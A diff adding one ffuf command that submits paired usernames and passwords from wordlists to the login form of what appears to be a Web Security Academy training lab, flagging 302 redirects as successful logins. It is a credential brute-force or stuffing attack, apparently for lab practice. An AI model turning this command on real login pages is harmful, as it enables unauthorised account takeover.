@@ -1,0 +1,8 @@
+ffuf -w usernames_list.txt:USER -w passwords_list.txt:PASS \
+  -u https://0a33007d04462aa9824757a000f20019.web-security-academy.net/login \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=USER&password=PASS" \
+  -mode pitchfork \
+  -t 1 \
+  -mc 302
